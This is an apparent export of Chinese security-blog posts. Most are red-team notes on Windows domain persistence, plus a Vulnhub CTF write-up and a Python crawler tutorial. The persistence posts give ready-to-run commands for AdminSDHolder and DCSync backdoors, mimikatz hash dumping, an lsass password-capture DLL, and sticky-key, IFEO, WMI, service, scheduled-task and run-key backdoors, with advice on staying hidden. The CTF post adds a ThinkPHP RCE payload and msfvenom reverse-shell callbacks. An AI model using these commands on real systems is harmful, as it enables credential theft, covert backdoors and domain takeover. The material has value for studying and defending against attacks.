在默认状态下，系统将定期（每60分钟）调用SDProp进程对域的AdminSDHolder对象的ACL与域中受保护的帐户和组的ACL进行比较。如果任何受保护帐户和组的ACL与AdminSDHolder对象的权限不匹配，则将受保护帐户和组的ACL重置为与域的AdminSDHolder对象的权限匹配 0x01.利用需要权限：域管理员 我们可以篡改AdminSDHolder容器的ACL配置。当系统调用SDProp进程执行工作时，被篡改的ACL配置将同步到受保护对象的ACL中，从而形成一个隐蔽的域后门 执行以下命令，通过PowerView向AdminSDHolder添加ACL，使普通用户jiang拥有对AdminSDHolder的完全控制权限 （需要高版本的powershell运行，这里用winserver2008自带的2.0版本运行不成功） 1234567Import-Module .\\PowerView.ps1#查询ad保护的域用户Get-NetUser -AdminCount |select samaccountname#添加ACLAdd-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity jiang -Rights All#删除ACLRemove-DomainObjectAcl -TargetSearchBase “LDAP://CN=AdminSDHolder,CN=System,DC=admin,DC=org” -PrincipalIdentity jiang -Rights All -Verbose SDProp执行后 删除 执行SDProp除了等待默认的60分钟后SDProp自动执行，我们还可以用以下两种方法来更快速的执行SDProp (1) 修改默认时间 如果需要修改60min的执行时间间隔，只需要在HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters中添加或修改AdminSDProtectFrequency的值 该值的范围是从60到7200，单位为秒，键类型为DWORD 可以直接使用命令行更改： 1reg add hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60 如果需要恢复为默认的60min，则可以在注册表中删除AdminSDProtectFrequency这一项 1reg delete hklm\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v AdminSDProtectFrequency HOOK PasswordChangeNotifyHook PasswordChangeNotify（lsass.exe进程劫持）主要是利用dll的来实时记录用户修改的密码，并且修改密码后会自动默认同步到c:\\windows\\temp\\passwords.txt中，可以利用该特性来实时监控并获取用户修改密码后的密码，或者也可以直接发送到指定的邮箱（Google有现成dll）。 在已经拿到域管账户和主机时，需要把提前准备的Hook PasswordChange.dll注入到lsass.exe进程中。用户修改密码操作时，输入新密码后，LSA 会调用 PasswordFileter 来检查该密码是否符合复杂性要求，如果密码符合要求，LSA 会调用PasswordChangeNotify，并在系统中记录密码信息，但是只适用于server服务器。 0x01.利用github下载编译好的工具包：https://github.com/Al1ex/Hook-PasswordChangeNotify 网上大部分教程都是去https://github.com/clymb3r/Misc-Windows-Hacking下载并编译，因为要求vs2015环境，比较麻烦，我就直接找现成的了 执行以下命令 12Import-Module .\\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass 手动修改域控密码，密码出现在C:\\Windows\\Temp\\password.txt内 如果想要手动修改密码存储路径，在https://github.com/clymb3r/Misc-Windows-Hacking项目内的HookPasswordChange.cpp文件中修改后编译。 DCSync攻击 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。 默认情况下，只有Administrator、Domain Controller和Enterprise Domain Admins组的用户和域控制器的机器账户才有执行DCSync的权限 0x01.利用DCSync导出域内hash1.mimikatz利用123456#导出域内指定用户的信息lsadump::dcsync /domain:god.org /user:administratorlsadump::dcsync /domain:god.org /user:administrator /csv#导出域内所有用户的信息，包括hash值lsadump::dcsync /domain:god.org /alllsadump::dcsync /domain:god.org /all /csv 2.Impacket下利用Impacket下的脚本secertsdump.py支持通过DCSync技术导出域控中的用户hash 执行以下命令 1python secretsdump.py god.org/administrator:Admin@123@192.168.3.21 -just-dc-user &quot;god.org\\administrator&quot; 0x02.利用DCSync维持域内权限 在获取域管理员权限后，可以手动为域内标准用户添加DCSync权限，从而实现隐蔽的域后门 通过PowerView.ps1脚本实现，命令如下 12345Import-Moudle .\\PowerView.ps1#为域用户添加DCSync权限Add-DomainObjectAcl -TargetIdentity &quot;DC=god,DC=org&quot; -PrincipalIdentity jiang -Rights DCSync -Verbose#删除DCSync权限Remove-DomainObjectAcl -TargetIdentity “DC=god,DC=org” -PrincipalIdentity jiang -Rights DCSync -Verbose 0x03.DCShadow DCShadow和DCSync同样利用了与域控之间的DRS数据同步机制，但和DCSync攻击思路相反，DCShadow通过创建恶意的域控制器，利用域控间的数据同步复制，将预先设定的对象或者对象属性注入正在运行的合法域控制器，从而创建域后门或者获取各种类型的非法访问渠道。 1.修改域用户的primaryGroupIDWindows利用RID来区分用户账户和组，常见RID如下表 组 RID 组 RID Administrator 500 Domain Guests 514 Guest 501 Domain Computers 515 Krbtgt 502 Domain Controllers 516 Domain Admins 512 Schema Admins 518 Domain Users 513 Enterprise Admins 519 ①以管理员权限运行mimikatz并依次执行以下命令，确保以system权限开启 123mimikatz # !+!processtokentoken::whoami ② 在该窗口的mimikatz执行以下命令，需要System权限的cmd 12#将域用户jiang设置为域管理员权限lsadump::dcshadow /object:CN=jiang,CN=Users,DC=god,DC=org /attribute:primaryGroupID /value:512 执行后先不要关闭该窗口。 ③另开一个域管理员权限的cmd，执行以下命令强制触发域复制，将数据推送给合法域控 1mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit 运行后报错如下，不知道哪里出了问题 小结域内权限维持到这里就告一段落了，权限维持部分的主要内容均来自Nu1L Team的书籍《内网渗透体系建设》第六章权限维持专题！强烈推荐这本书！！！","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"权限维持","slug":"权限维持","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"事件触发执行类后门","slug":"事件触发执行","date":"2022-11-28T07:02:33.392Z","updated":"2022-11-28T07:23:25.076Z","comments":true,"path":"2022/11/28/事件触发执行/","link":"","permalink":"http://example.com/2022/11/28/%E4%BA%8B%E4%BB%B6%E8%A7%A6%E5%8F%91%E6%89%A7%E8%A1%8C/","excerpt":"","text":"利用WMI事件订阅Windows Management Instrumentation (WMI) 使系统管理员能够在本地和远程执行任务。从红队的角度来看，WMI 可用于执行多种活动，例如横向移动、持久性、态势感知、代码执行以及作为命令和控制(C2)。 WMI事件订阅通过在远程主机上部署永久事件订阅，在指定进程启动时，执行特定的后门或者攻击载荷，以建立持久化后门。 需要管理员级别的权限 通常，通过 WMI 事件订阅的持久性需要创建以下三个类，它们用于存储有效负载或任意命令，指定将触发有效负载的事件并将两个类（__EventConsumer &amp;__EventFilter）关联起来，以便执行和触发绑定一起。 __EventFilter &#x2F;&#x2F; 触发器（新进程、登录失败等） EventConsumer &#x2F;&#x2F; 执行动作（执行有效载荷等） __FilterToConsumerBinding &#x2F;&#x2F; 绑定过滤器和消费者类 WMI事件订阅需要分别创建事件过滤器和事件消费者，并将二者关联起来，以将事件发生和触发执行绑定在一起。 0x01.工具利用1.Sharp-WMIEvent 在目标主机中执行以下命令 12Import-Module .\\Sharp-WMIEvent.ps1Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe&quot; /c C:\\Windows\\System32\\shell.exe(恶意程序路径) 将在主机上生成一个随机命名的永久事件订阅，当用户登陆时将执行恶意程序 2.Metasploit **模块:**exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence 0x02 防御：关于此类攻击的防御，只需关注相关事件即可： 1234&lt;RuleGroup name=&quot;&quot; groupRelation=&quot;or&quot;&gt;&lt;!-- Event ID 19,20,21, == WmiEvent. Log all WmiEventFilter, WmiEventConsumer, WmiEventConsumerToFilter activity--&gt;&lt;WmiEvent onmatch=&quot;exclude&quot;/&gt;&lt;/RuleGroup&gt; 或者查看各类wmi的情况： 查看系统上注册的WMI事件消费者 1Get-WMIObject -Namespace root/Subscription -Class __EventConsumer 查看系统上注册的事件过滤器 1Get-WMIObject -Namespace root/Subscription -Class __EventFilter 查看系统上已经绑定的过滤器和消费者 1Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding 然后移除即可 123Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter “Name=’Updater’” | Remove-WmiObject -VerboseGet-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter “Name=’Updater’” | Remove-WmiObject -VerboseGet-WMIObject -Namespace root\\Subscription -Class __FilterToConsumerBinding -Filter “__Path 利用系统辅助功能Windows系统包含了许多供用户通过组合键启动的辅助功能，攻击者可以通过修改这些程序的启动方式，以获取目标主机的命令行或者运行指定的后门攻击载荷，不需要登录系统即可获取目标主机权限。 常见的辅助功能程序如下所示: 程序 功能 热键组合 sethc.exe 粘滞键 连按五次”shift” magnify.exe 放大镜 Windows + “+” utilman.exe 实用程序 Windows + “U” osk.exe 屏幕键盘 Windows + Ctrl + O displayswitch.exe 屏幕扩展 Windows + P atbroker.exe 辅助管理工具 narrator.exe 讲述者 Windows + Ctrl + Enter 在高版本的windows中，C:\\Windows\\system32目录下的文件受到系统保护，只有TrustedInstaller权限的用户才能对其中的文件拥有修改和写入权限。所以在替换辅助功能前需要利用令牌窃取提升至TrustedInstaller权限。 获取TrustedInstaller权限后执行以下命令（以粘滞键为例） 123cd C:\\Windows\\System32move sethc.exe sethc.exe.bak //重命名sethc.execopy cmd.exe sethc.exe //将cmd.exe副本伪装成sethc.exe 或者在获取session后利用MSF use post/windows/manage/sticky_keys模块一键生成粘滞键后门 RDP劫持系统管理员和用户通常可以通过 RDP（远程桌面）协议登录指定服务器3389远程桌面，而攻击者可以通过可以特权提升至 SYSTEM 权限的用户，可以在不知道其他用户登录凭据的情况下，用来劫持其他用户的 RDP 会话，该漏洞在2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。利用条件只需要获取机器system权限执行tscon命令。 1.quser 或者 qwinsta 查看会话id 2.cmd执行以下命令劫持会话 123sc create rdp binpath= &quot;cmd.exe /k tscon 会话id /dest:console&quot;sc qc rdpsc start rdp 或者使用psexec执行以下命令 123psexec -s -i cmdqusertscon 2 /dest:console IFEO注入映像劫持是Windows内设的用来调试程序的功能。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。 原理:是注册表路径下IFEO（image file execution options）的对应exe程序被修改，然后进行重定向执行后门程序的过程。在执行A程序时候，由于IFEO劫持的原因执行了B程序 注册表路径：\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options Debugger值在运行某exe程序时候，系统会在注册表image file execution option中寻找是否存在exe的项 在进一步去寻找是否有Debugger字符串的值 其优先权&gt;该程序的绝对路径的程序 编辑Dubugger值，我们就可以通过修改注册表的方式来创建粘滞键后门，而不需要获取TrustedInstaller权限 IFEO创建粘滞键后门 使用以下命令添加映像劫持，并将Debugger值替换成要执行的程序 1reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\\Windows\\System32\\cmd.exe&quot; 执行后注册表成功添加（Win10安全中心会直接报严重，不能添加） 后门创建成功 GlobalFlag值GlobalFlag值在指定程序禁默退出时启动对应监控程序，需要设置以下三个注册表实现 12345678#启用对记事本进程的静默退出监视reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512#启用Windows错误报告进程WerFault.exe，它将成为reverse_tcp.exe的父进程reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1#将监视器进程设为reverse_tcp.exereg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; /v MonitorProcess /d &quot;C: \\Windows\\System32\\reverse_tcp.exe&quot; 当用户打开记事本(notepad.exe) 时，程序正常启动。当用户关闭记事本或相关进程被杀死后时，将在WerFaultexe进程中创建子进程以运行后门程序reverse _tcp.exe DLL劫持在权限提升中已经有过相关内容，这里补充一个劫持系统服务 MSDTC（Distributed Transaction Coordinator）负责协调跨多个数据库、消息队列、文件系统等资源管理器的事务。服务启动后将尝试在C:\\Windows\\System32中加载oci.dll文件，但该文件默认不存在 我们可以制作一个同名的恶意dll文件放入System32目录，当MSDTC服务启动时，恶意dll将会加载到msdtc.exe中。 在某些版本操作系统中，MSDTC服务启动类型默认为手动 可通过以下命令将启动类型改为自动 sc config msdtc start= &quot;auto&quot;","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"权限维持","slug":"权限维持","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"常见后门技术","slug":"常见后门技术","date":"2022-11-22T07:52:34.550Z","updated":"2022-11-22T13:05:58.518Z","comments":true,"path":"2022/11/22/常见后门技术/","link":"","permalink":"http://example.com/2022/11/22/%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/","excerpt":"","text":"windows建立隐藏用户1.添加隐藏用户 1net user username$ passwd /add 2.注册表克隆用户隐藏 win+r —&gt;regedit打开注册表，找到如图路径 发现没有权限查看 点击菜单栏编辑–&gt;权限 修改相应内容 可以在以下路径看到本机所有用户，且类型与Users中一一对应 导出用户 在用户名上右击→导出即可，设为1.reg 由上图可知，Administrator用户的类型为0x1f4，在注册表000001F4路径下复制F类型的数据，替换到所需添加的用户的类型中，然后在该用户类型的路径上右击导出，设为2.reg。 3.删除第一步添加的用户 1net user jiang$ /del 4.使用注册表文件注册用户 运行1.reg→运行2.reg即可，该用户只能在注册表中能看到。 开启3389即可通过远程桌面连接获取管理员权限 如果连接不成功,可能是防火墙拦截，使用如下命令打开防火墙3389端口 反制手段 查看注册表 或者使用D盾查看 系统服务后门1.创建系统服务执行以下命令 1sc create backdoor binpath= &quot;cmd.exe /k C:\\Windows\\System32\\reverse_tcp.exe(创建的后门文件路径)&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot; 在注册表中即可找到生成的服务 当目标系统或者服务重启时候，将以System权限运行所指定的后门程序，从而获得持久权限 2.利用现有服务利用sc config修改现有服务的binpath选项或者注册表的ImagePath键，比起直接创建新服务，此方法更不容易被发现 1sc config 服务名 binpath= &quot;cmd.exe /k 后门文件路径&quot; 3.利用svchost.exe启动服务svchost.exe本身只是作为服务宿主，并不实现任何服务功能，需要svchost.exe启动的服务以动态链接库（DLL）形式实现，在安装这些服务时，把服务的可执行程序指向svchost.exe，启动这些服务时由svchost.exe调用相应服务的动态链接库来启动服务。而具体调用哪个DLL则由该服务在注册表中的信息决定的 因为许多系统服务通过注入该程序进程中启动，所以系统中存在多个该程序的进程 下面以wuauserv服务为例，由该服务imagepath的值可知，该服务是通过svchost.exe加载DLL文件实现的。 该服务注册表下还有一个子项，其中ServiceDll键值表明了该服务加载哪个dll文件。服务启动时，svchost就会加载对应的dll文件 系统会根据可执行文件路径中的参数对服务进行分组，如C:\\Windows\\system32\\svchost.exe -k netsvcs 表明该服务属于netsvcs服务组，通常一个服务组代表一个进程，而不是一个服务代表一个svchost进程。 svchost.exe的所有服务分组位于注册表的HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost中，通过svchost.exe启动的服务都要在该表中注册 使用svchost建立后门 1.制作一个恶意的dll文件，以msf为例 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f dll -o shell.dll 2.将生成的dll文件上传至主机System32目录，并安装和配置恶意服务 1234567891011121314#创建Backdoor服务，并以svchost加载的方式启动，服务分组为netsvcsc create Backdoor binpath= &quot;C:\\\\Windows\\System32\\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem#将Backdoor服务加载的dll设置为shell.dllreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Backdoor\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\\Windows\\System32\\shell.dll&quot;#配置服务描述reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Backdoor /v Description /t REG_SZ /d &quot;Windows xxx Service&quot;#配置服务显示名称reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Backdoor /v DisplayName /t REG_SZ /d &quot;Backdoor&quot;#创建服务新分组netsvc，并将Backdoor服务添加进去reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d Backdoor 当系统重启时，svchost将会以system权限加载恶意服务 计划任务后门12#在目标主机创建Backdoor计划任务，在每天08:00以system权限运行shell.exeschtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\\Windows\\System32\\shell.exe /RU System /F 12#在目标主机创建Backdoor计划任务，在每60s以system权限运行shell.exeschtasks /Create /TN Backdoor /SC minute /MO 1 /TR C:\\Windows\\System32\\shell.exe /RU System /F 计划任务在windows中存储在计划任务管理库中，存储形式类似文件目录 因此，为了加强隐蔽性，创建计划任务后门时，可以指定存储目录，而不是存储在根目录下，如以下命令所示 1schtasks /Create /TN \\Microsoft\\Windows\\AppTask\\AppRun /SC daily /ST 08:00 /MO 1 /TR C:\\Windows\\System32\\shell.exe /RU System /F 启动项&#x2F;注册表键后门1.系统启动文件夹将程序放置在启动文件夹会导致该程序在用户登录的时候执行 以下是windows常见的启动文件夹: 1234#在所有用户登录时启动C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp #在指定用户登录时启动C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 2.运行键通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。 常用的注册表启动键： 12345# Run键 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce 添加运行键 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\\Windows\\System32\\shell.exe(创建的后门文件路径)&quot; 3.Winlogon Helper1234#指定Windows身份验证期间执行的程序，默认为exploer.exeHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell#指定用户登陆时执行的用户初始化程序，默认为userinit.exeHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 执行以下命令 1reg add &quot;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Userinit /d &quot;C:\\Windows\\System32\\userinit.exe,shell.exe&quot; /f 将在Userinit键值中添加一个后门程序，在用户登录时启动 4.Port MonitorsWindows打印服务Print Spooler和进程spoolsv.exe，在添加端口监视器Port Monitors时，可以利用来加载恶意的DLL文件，实现权限维持，因为是系统服务运行，所以权限是SYSTEM，也会用来提权。 利用msf生成恶意dll 将生成的dll上传至目标主机的C:\\Windows\\System32目录，并执行以下命令 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\Test&quot; /v &quot;Driver&quot; /d &quot;shell.dll&quot; /t REG_SZ 当系统注销、启动和重启时都会加载Monitors下Driver指定的dll文件，加载时的权限为system","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"权限维持","slug":"权限维持","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"Vulnhub靶场 实习线上面试环境","slug":"实习线上面试环境","date":"2022-11-17T07:36:41.027Z","updated":"2022-11-17T07:57:52.351Z","comments":true,"path":"2022/11/17/实习线上面试环境/","link":"","permalink":"http://example.com/2022/11/17/%E5%AE%9E%E4%B9%A0%E7%BA%BF%E4%B8%8A%E9%9D%A2%E8%AF%95%E7%8E%AF%E5%A2%83/","excerpt":"","text":"环境攻击机：192.168.189.129 靶机：192.168.189.136 题目一：命令执行访问http://192.168.189.136:64628/ 给出提示让我们用cmd参数执行命令 然后 就有了flag？ 题目二：ThinkphpRCEhttp://192.168.189.136:49171/ 访问后看到ico图标是thinkphp的 随手访问下&#x2F;index.php，报错获得版本号为5.1.30 搜下对应版本，发现该版本有一个RCE洞 百度找到了payload，联想之前flag是 ls &#x2F;tmp ，就执行ls &#x2F;tmp 1234?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /tmp 题目三 ThinkPHP 3.x Log RCEhttp://192.168.189.136:55170/ 访问后一片空白，目录扫描扫到&#x2F;admin&#x2F;index.html，发现还是thinkphp 上工具扫一波漏洞，又一个rce 看日志太多了 ，利用工具直接getshell http://192.168.189.136:55170///?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/22_11_17.log pass&#x3D;peiqi 蚁剑连接后去tmp目录下寻找flag 题目四：内网目录遍历提示需要通过前面的shell进入内网进行测试 通过刚刚获取的shell上线msf 上线msfmsf生成木马 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.189.129 LPORT=7777 -f elf -o shell.elf msf设置监听 12345use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lport 7777set lhost 192.168.189.129run 上传木马并给予执行权限 12chmod +x shell.elf./shell.elf 成功获取shell 设置代理执行ifconfig发现该靶机在192.168.20网段有一张网卡 添加路由 run autoroute -s 192.168.20.0/24 扫描网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.168.20.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 设置socks代理 use auxiliary/server/socks_proxy 利用proxifier代理到本机 1.添加代理服务器 2.配置代理规则 访问上面扫到的端口 发现192.168.20.3对应题目四，是一个目录遍历 前往tmp获取flag emmm 这个靶场比较偏简单，适合初学内网的新手来打(ps 早知道这么简单就直接用插件代理流量了)","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"python爬虫(request库与简单数据解析)","slug":"request库与简单数据解析","date":"2022-11-03T02:32:00.988Z","updated":"2022-11-21T08:36:51.173Z","comments":true,"path":"2022/11/03/request库与简单数据解析/","link":"","permalink":"http://example.com/2022/11/03/request%E5%BA%93%E4%B8%8E%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90/","excerpt":"","text":"分类： 通用爬虫： 抓取系统重要组成部分，抓取互联网的一整张页面数据 聚焦爬虫: 抓取页面中特定的局部内容 增量式爬虫: 监测网站中数据更新情况，爬取最新更新的数据 requests模块指定url –&gt;发起请求–&gt;获取响应数据–&gt;持久化存储 项目1：简单get请求并在本地存储123456789url = &#x27;https://www.sogou.com/&#x27; #get请求 response = requests.get(url) #返回字符串形式响应数据 page_text = response.text print(page_text) #持久化存储 with open(&#x27;./1.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(page_text) 项目2：关键词搜索界面爬取requests.get(url,param) **param:**请求参数,数据类型为字典 UA伪装：让爬虫对应的请求数据伪装为一款浏览器，伪装user-agent 12345678910111213141516import requestsif __name__ == &quot;__main__&quot;: header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125; url=&#x27;https://www.sogou.com/web&#x27; kw = input(&#x27;inter your word:&#x27;) param=&#123; &#x27;query&#x27;:kw &#125; response = requests.get(url,params=param,headers=header) page_text= response.text fileName = kw + &#x27;.html&#x27; with open(fileName,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(page_text) print(fileName,&#x27;保存成功&#x27;) 项目3：有道翻译ajax请求：是一种在无需重新加载整个网页的情况下能够更新部分网页的技术。 定位请求数据包方法： 数据局部修改查看Fetch&#x2F;XHR请求 谷歌浏览器右键检查 F12 网络筛选 查看载荷定位数据包（这里定位为langdetect数据包） 123456789101112131415161718192021222324252627282930313233343536373839import jsonimport requestsimport time,random,hashliblts = str(int(time.time()*1000))salt = lts + str(random.randint(0,9))i = input(&#x27;输入你要翻译的句子：&#x27;)sign_str = &#x27;fanyideskweb&#x27; + i + salt + &#x27;Ygy_4c=r#e#4EX^NUGUc5&#x27;m = hashlib.md5()m.update(sign_str.encode())sign = m.hexdigest()url=&#x27;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&#x27;data=&#123; &quot;i&quot;: i, &quot;from&quot;: &quot;AUTO&quot;, &quot;to&quot;: &quot;AUTO&quot;, &quot;smartresult&quot;: &quot;dict&quot;, &quot;client&quot;: &quot;fanyideskweb&quot;, &quot;salt&quot;: salt, &quot;sign&quot;: sign, &quot;lts&quot;: lts, &quot;bv&quot;: &quot;4b14f827cdc3aab7d8d501b4087648f8&quot;, &quot;doctype&quot;: &quot;json&quot;, &quot;version&quot;: &quot;2.1&quot;, &quot;keyfrom&quot;: &quot;fanyi.web&quot;, &quot;action&quot;: &quot;FY_BY_REALTlME&quot;,&#125;headers = &#123; &quot;Referer&quot;: &quot;https://fanyi.youdao.com/&quot;, &quot;Cookie&quot;: &quot;OUTFOX_SEARCH_USER_ID=-1124603977@10.108.162.139; JSESSIONID=aaamH0NjhkDAeAV9d28-x; OUTFOX_SEARCH_USER_ID_NCOO=1827884489.6445506; fanyi-ad-id=305426; fanyi-ad-closed=1; ___rl__test__cookies=1649216072438&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&quot;&#125;res = requests.post(url,headers=headers,data=data)res_json=res.json()print(res.json())fileName = i + &#x27;.json&#x27;fp = open(fileName,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 项目4：豆瓣电影分类排行榜滚轮拖动到底部，又加载出一批新数据 -&gt;页面局部刷新 -&gt;ajax请求 12345678910111213141516171819import jsonimport requestsurl=&#x27;https://movie.douban.com/j/chart/top_list&#x27;header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125;param=&#123; &#x27;type&#x27;: &#x27;24&#x27;, &#x27;interval_id&#x27;: &#x27;100:90&#x27;, &#x27;action&#x27;:&#x27;&#x27;, &#x27;start&#x27;: &#x27;0&#x27;,#从库中第几部开始取 &#x27;limit&#x27;: &#x27;20&#x27;,#一次取的个数&#125;res=requests.get(url,params=param,headers=header)res_json=res.json()fp = open(&#x27;电影.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 项目5：肯德基餐厅查询1234567891011121314151617import requests,jsonurl=&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#x27;header=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;param=&#123; &#x27;cname&#x27;: &#x27;柳州&#x27;, &#x27;pid&#x27;: &#x27;&#x27;, &#x27;keyword&#x27;: &#x27;&#x27;, &#x27;pageIndex&#x27;: &#x27;1&#x27;, &#x27;pageSize&#x27;: &#x27;10&#x27;&#125;res=requests.post(url,params=param,headers=header)res_json=res.json()fp = open(&#x27;place.json&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)json.dump(res_json,fp=fp,ensure_ascii=False)print(&#x27;over&#x27;) 分类: 正则 bs4 xpath 原理 数据存储在标签之间或者标签对应的属性中存储 1.进行指定标签定位 2.将标签或者标签所对应的数据中存储的数据进行提取 图片爬取与本地化存储图片数据爬取后用**.content**可以输出以二进制形式保存的数据 利用**’wb’:**以二进制形式打开并写入 12345import requestsurl=&#x27;https://tupian-1308226518.cos.ap-guangzhou.myqcloud.com/typora/202210101606312.png&#x27;res = requests.get(url=url).contentwith open(&#x27;./tp.png&#x27;,&#x27;wb&#x27;,) as fp: fp.write(res) 数据解析正则表达式:使用re库 常用元字符 . 匹配除了换行符以外的所有字符 \\w 匹配字母或者数字或下划线 \\s 匹配任意空白符 \\d 匹配数字 \\n 